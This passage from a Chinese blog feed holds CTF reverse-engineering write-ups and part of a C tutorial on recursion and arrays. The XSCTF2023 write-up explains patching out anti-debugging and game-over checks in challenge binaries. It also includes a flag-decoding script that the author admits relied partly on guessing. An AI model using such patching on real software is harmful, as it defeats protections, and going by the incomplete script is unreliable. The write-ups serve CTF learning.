class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// export_data.exe输出的结果放入</span></span><br><span class="line">    <span class="type">char</span> str[<span class="number">1000</span>]=<span class="string">&quot;\x65\x63\x6b\x68\x33\x32\x74\x72\x6d\x30\x73\x7b\x6d\x31\x74\x33\x37\x69\x5f\x33\x34\x65\x5f\x73\x72\x33\x69\x73\x5f\x30&quot;</span></span><br><span class="line">                   <span class="string">&quot;\x37\x5f\x34\x6e\x79\x64\x5f\x63\x31\x6d\x5f\x76\x33\x72\x74\x35\x75\x6a\x74\x34\x70\x5f\x6c\x26\x68\x63\x5f\x6b\x6f\x30&quot;</span></span><br><span class="line">                   <span class="string">&quot;\x6d\x5f\x74\x34\x72\x6f\x6d\x33\x00\x00\x7d\x79&quot;</span>;</span><br><span class="line">    <span class="comment">// 4个字符一组进行翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="type">char</span> tmp = str[i];</span><br><span class="line">        str[i] = str[i + <span class="number">3</span>];</span><br><span class="line">        str[i + <span class="number">3</span>] = tmp;</span><br><span class="line">        tmp = str[i + <span class="number">1</span>];</span><br><span class="line">        str[i + <span class="number">1</span>] = str[i + <span class="number">2</span>];</span><br><span class="line">        str[i + <span class="number">2</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="built_in">puts</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114001249077.png" alt="image-20231114001249077" style="zoom:50%;" /><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-XSCTF2023决赛</title>
      <link href="/2023-11-06-c4ec60454895/"/>
      <url>/2023-11-06-c4ec60454895/</url>
      
        <content type="html"><![CDATA[<p>只做出来2道题QWQ</p><h1 id="学到的知识点">学到的知识点</h1><h2 id="c-try-catch">C++ try…catch</h2><p>C++逆向那道题中有一个函数在运行时引发了一个异常,最后的处理函数是一个Xor()函数,将flag进行了一次特定的异或加密.找了很久才找到,最后看汇编找跳转才找到…不过最后还是不是特别清楚c++的异常机制,毕竟c++编译器底层做的事太多了.</p><h2 id="crc32校验">CRC32校验</h2><p>貌似…是…Crackme那道题是有一个CRC32的校验.</p><h1 id="reverse">Reverse</h1><h2 id="esab64">esab64</h2><p>这道题是c++逆向,没有提供pdb文件之前,代码比较混乱,但是还是能分析的,后续提示更新了pdb文件后更加清晰.</p><p>总之就是对flag进行了一遍变表base64编码,然后每四个字符一组进行翻转,就是最终的密文.</p><p>分析如下(pdb文件提供之前的分析):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106160411279.png" alt="image-20231106160411279" style="zoom:50%;" /><p>反序后再变表base64解码,很简单,但是逆向解码出来后发现乱码:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106160643056.png" alt="image-20231106160643056"></p><p>后续提示去分析c++ try…catch,说明程序中某个地方故意引发了异常,在处理异常的时候进行了一些额外的加密.</p><p>去考虑代码,这个额外加密一定在base64之前,因为分析发现(甚至经过了大量的调试验证),最终密文检验确实是base64并反序的密文和真正的密文按顺序比较:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106161422267.png" alt="image-20231106161422267" style="zoom:50%;" /><p>动态调试分析,手动提取出每次比较的两个寄存器值,发现确实就是变表base64(反转过的)的结果依次比较,没有任何问题.</p><p>动调前的准备工作:有反调试,patch掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106161959207.png" alt="image-20231106161959207" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162029511.png" alt="image-20231106162029511" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162112078.png" alt="image-20231106162112078" style="zoom:50%;" /><p>另外还有,为了逐个检查比较的字符,还需要对检查密文匹配的循环里的if语句进行修改,让其不会退出循环:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162337894.png" alt="image-20231106162337894" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162510282.png" alt="image-20231106162510282" style="zoom: 33%;" /><p>这样就可以进行调试了,最终只剩下那个异常处理的问题了.</p><p>在提供了pdb文件后,代码高度还原为c++代码,那个神秘函数名也还原为Exception():</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162721729.png" alt="image-20231106162721729" style="zoom:33%;" /><p>但是进去分析伪代码什么都没有,于是从汇编下手,但是由于知识所限,寻找了很久才找到:</p><p>从Exception()函数的汇编进去,发现push了一个结构体<code>stru_FF3CC8</code>,进去看发现有两个标号<code>$LN5</code>,<code>$LN6</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106163916637.png" alt="image-20231106163916637" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164039570.png" alt="image-20231106164039570" style="zoom:50%;" /><p>跳转回去查看,最终找到一个&quot;隐藏&quot;的Xor()函数:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164218206.png" alt="image-20231106164218206"></p><p>(可能分析的不是很对,这里好像就是已经进入函数了?)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164316316.png" alt="image-20231106164316316" style="zoom:50%;" /><p>代码很简单,我们直接对解密的乱码再如上进行一遍对应的异或即可.</p><p>最终的解密代码如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>():</span><br><span class="line">    <span class="comment"># 方法2</span></span><br><span class="line">    <span class="comment"># str1 = &#x27;UYP7wQcTBee0Z6V3t66TAbJK+YCKWZPhVpf3R5P4ZHcEWVP5yiXFXHr4W4OBmT==&#x27;</span></span><br><span class="line">    <span class="comment"># 4个字符一组，反转:</span></span><br><span class="line">    str1 = <span class="string">&#x27;7PYUTcQw0eeB3V6ZT66tKJbAKCY+hPZW3fpV4P5REcHZ5PVWFXiy4rHXBO4WTm==&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;m2jrJbkftp1KoBFNZhwE56OysH0z473T8VRW9l/PGixgdM+UeQCaDucXIYSnLvqA&#x27;</span></span><br><span class="line">    flag = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上面的解密结果有一点问题?</span></span><br><span class="line">    <span class="comment"># 最终用在线网站进行解密导出,并进行合理猜测得出flag</span></span><br><span class="line">    <span class="comment"># 乱码,甚至爆破都发现没有任何哪3个字符能编码出7PYU</span></span><br><span class="line">    flag = <span class="string">b&#x27;v~o\x7flRk\x0c\x0dz\x15P&#125;UH,A\x7f/.nFt#xraru&quot;OfPRxc;zWp6w5g#|&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] ^ (<span class="built_in">len</span>(flag) - i)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">decrypt2()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过中间可能漏了一些字符之类的,总之经过&quot;合理猜测&quot;,最终得出flag.</p><h2 id="中毒白块儿">中毒白块儿</h2><p>这题直接把检测游戏结束的函数里的代码删了就行…相当于开无敌挂…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164912110.png" alt="image-20231106164912110"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164928927.png" alt="image-20231106164928927"></p><p>然后再去运行,跑一会儿随便点点就出flag了.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-12_3-函数的其他用法和特性</title>
      <link href="/2023-11-01-39a6f8c668c3/"/>
      <url>/2023-11-01-39a6f8c668c3/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><ol><li>本部分讲解C函数与数组的相关问题</li><li>并且引入<code>递归</code>的思想</li></ol><p>前置知识:</p><ol><li>充分掌握前面关于数组的知识</li><li>可能的话了解一点<code>指针</code>的概念</li></ol><h1 id="函数的递归">函数的递归</h1><h2 id="两种基本的思想">两种基本的思想</h2><p>我们在求解各种问题的时候,往往会有各种方法,不过大部分方法分析起来,往往能归为几种基本的思想.常见的两种思想就是<code>迭代</code>和<code>递归</code>.</p><p><code>递归</code>,是一种问题求解的思想,往往将一个问题转化为(若干个)规模更小的子问题进行求解.子问题逐渐细分到最小,此时就变得很容易求解.放到实际编程中来说,就是<code>函数自己调用自己</code>的过程.</p><p>另一种思想是<code>迭代</code>,简单来说,就是重复某一个过程,逐渐更新状态,一步步接近最终的结果,达到求解的效果放到编程语言中,一般是使用<code>若干个,可以嵌套的循环 </code>进行不断地重复逼近.</p><p>两种思想,仅仅是思想,并不代表具体的问题只能以某一种思路去求解,例如<code>斐波那契数列</code>的求解,就可以使用两种方法去写,下面也使用这个例子进行讲解.</p><h2 id="什么是函数递归调用">什么是函数递归调用</h2><p><code>递归</code>是这样一种思想,侧重点为:将一个规模较大的问题分解为规模更小的子问题去求解,直到子问题足够小变得很容易计算,再依次返回并<code>逐层完成</code>依赖于这个子问题的<code>更大规模</code>的子问题,最终实现求解原本规模的问题.</p><p>实际上这种思想在数学中已经有所体现,例如函数:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.24999999999999992em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mn>0</mn><mspace width="1em"/><mi>x</mi><mo>&lt;</mo><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>3</mn><mspace width="1em"/><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f(x)=\left\{\begin{aligned}    0 \quad x&lt;=0 \\  f(x-1)*3 \quad x&gt;0 \\\end{aligned}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.00003em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>当<code>x&gt;0</code>时,想要求出函数值,自然需要不断对x减1,才能得到最终的值,当然,这个简单的函数可以推导公式,但是这里的重点是<code>递归</code>.</p><br><p>我们举一个很简单的例子,那就是斐波那契数列,其数学公式为:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>F</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">F(n) = \begin{cases}    0 &amp; \text{if } n = 0 \\    1 &amp; \text{if } n = 1 \\    F(n-1) + F(n-2) &amp; \text{if } n &gt; 1\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>显然,我们也可以使用递推(数学上)的方式去进行逐个求解(相信各位都会手算).那么我们的问题是:如何使用C语言去实现这个递推的过程?</p><br><p>C语言的函数支持<code>递归</code>,也就是函数的自调用,那么根据递推公式,我们可以写下如下代码来计算斐波那契数列的第n个数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入要计算的斐波那契数列的项数：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无效的输入\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> result = fibonacci(n);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;斐波那契数列的第 %d 项是 %d\n&quot;</span>, n, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以自行运行尝试.</p><br><p>代码解释:</p><p>在上面的代码中,我们在main函数中使用<code>fibonacci(n)</code>来计算第n项的值.关键在fibonacci()的代码中,我们可以看到,在函数的一开头,有一个判断,检查n的值是否为1或2(因为小于等于0的情况被main函数中的if给处理掉了).</p><p>如果n为1或2,显然,斐波那契数列的前两项都是<code>1</code>.那么该函数直接返回1作为结果即可(注意,我们此时丝毫不关心他返回到哪个函数!).</p><p>否则,n就是<code>3及3以上</code>的数,那么根据递推公式<code>F[n]=F[n-1]+F[n-2],n&gt;=3</code>可知,我们需要分别计算<code>fibonacci(n-1)</code>和<code>fibonacci(n-2)</code>,并把他们相加的值返回,也就有了<code>return fibonacci(n - 1) + fibonacci(n - 2);</code>这一条语句.</p><p>显然,这两个调用仍然是<code>fibonacci()</code>这个函数,只不过调用时使用的值不同而已.我们发现,每次在<code>fibonacci()</code>中调用自己,传递的参数不是<code>n-1</code>就是<code>n-2</code>,这样就保证最终在某一层的调用中,n的值减少到了1或者2,此时函数直接返回,不再需要进一步的递归.</p><p>到了这步,函数便逐层地结束,一层层地将运算的值返回给<code>上一层</code>,由上一层将这层的两次调用函数的返回值相加,把结果返回给再上一层,直到最终返回到顶层,即原来要求解的n.</p><p>最终,所有的递归调用的运算结果都汇总到一个<code>fibonacci()</code>的调用,也就是main()函数一开始调用的那一个,然后其再次返回相加的值(当然,如果n一开始就是1或者2,则根本不会有这么多的递归过程),赋值给main中的result变量.</p><br><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231108204235065.png" alt="image-20231108204235065" style="zoom:50%;" /><p>斐波那契的递归求解就是如此简单,只需要短短的3行即可.</p><br><p>我们使用CLion在<code>return 1;</code>下断点进行调试也能发现,函数逐层递归,直到最底层的(逻辑上的底层,实际的栈顶)一次调用结束,才能返回到上一层继续运行:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231108204119666.png" alt="image-20231108204119666" style="zoom:50%;" /><p>当n为5时,实际上的<code>调用过程</code>类似这样:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231205172718566.png" alt="image-20231205172718566" style="zoom:50%;" /><p>其中箭头上的数字代表函数调用的顺序,例如第一个调用就是main()调用fibonacci(),此时n为5.</p><p>可以看到,return语句的表达式中有2个递归调用,所以<code>调用链</code>看起来就像是一个<code>二叉树</code>一样.</p><h1 id="c函数与数组">C函数与数组</h1><h2 id="可以数组作为参数">可以数组作为参数?</h2><h3 id="先上结论">先上结论</h3><p><code>这是一个新手非常容易犯错的问题</code>.十分明确的一点是,C语言中无论是<code>函数参数</code>还是<code>函数返回值</code>,都只能对应一个一般的变量,而不能将一个<code>数组</code>作为一个整体进行参数传递.</p><p>尽管我们某种程度上认为数组是&quot;一个&quot;变量(在后面讲解指针和数组的关系时会详细描述)—只不过被划分为各个子元素.但是C语言并没有提供一种方法,用以实现将整个数组作为参数进行传递,或者是将一个数组作为返回值进行返回.</p><p>而这一点看起来十分冲突,特别是在我们后面学习了结构体后这一问题会尤为突出.一种理解方式是,结构体的各个字段并不是单一的变量,而是作为结构体的一部分,一个结构体变量此时作为一个整体被视为一个单一的变量.</p><h3 id="使用数组作为形参">使用数组作为形参</h3><p>尽管我们不能将一整个数组作为参数复制过去,但是我们仍然可以为函数制定一个数组形式的参数,但是这个参数很特殊.</p><p>我们看一个代码,这个程序用于输出某个数组的所有元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr2[<span class="number">10</span>])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    print_arr(arr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231111143707285.png" alt="image-20231111143707285" style="zoom:50%;" /><p>上面这个程序读起来十分容易,看上去<code>print_arr()</code>接受了一个&quot;数组参数&quot;,然后将每一个元素进行输出.</p><br><p>但是下面的代码就会让你发现,对函数形参arr2的&quot;各个元素&quot;进行修改是会影响到main中的arr的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr2[<span class="number">10</span>])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;change arr2 in print_arr\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i 